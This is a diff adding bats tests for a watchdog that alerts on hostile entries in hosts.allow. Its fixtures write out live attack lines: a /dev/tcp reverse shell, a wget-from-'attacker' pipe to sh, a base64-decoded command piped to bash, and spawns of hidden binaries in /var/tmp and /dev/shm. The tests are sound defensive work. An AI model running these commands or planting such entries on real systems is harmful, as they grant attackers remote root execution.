@@ -129,3 +129,72 @@ seed_benign() {
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — hosts.allow inventory enumerates remote-trigger root-exec surface)" {
+    seed_benign
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (twist command also fires — symmetric to spawn): twist <evil> → alert" {
+    # twist is the sibling of spawn — different semantics (replace
+    # connection, run command) but same root-exec attack surface.
+    seed_benign
+    run_wd
+    printf 'ALL: ALL: twist bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HALLOW}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh in spawn): wget bootstrap → alert" {
+    seed_benign
+    run_wd
+    printf 'ALL: ALL: spawn wget -qO- http://attacker/p | sh\n' > "${HALLOW}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe in spawn): obfuscation → alert" {
+    seed_benign
+    run_wd
+    printf 'ALL: ALL: spawn echo YmFzaCAtaQ== | base64 -d | bash\n' > "${HALLOW}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (spawn under /var/tmp): writable-root expansion" {
+    seed_benign
+    run_wd
+    printf 'ALL: ALL: spawn /var/tmp/.x %%h\n' > "${HALLOW}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (spawn under /dev/shm): tmpfs writable-root coverage" {
+    seed_benign
+    run_wd
+    printf 'ALL: ALL: spawn /dev/shm/.x %%h\n' > "${HALLOW}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (group-writable hosts.allow): group-writable → alert above world-writable bar" {
+    seed_benign
+    run_wd
+    chmod 0664 "${HALLOW}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    seed_benign
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-hosts-allow -- ')
+    [ "${main_count}" = "1" ]
+}
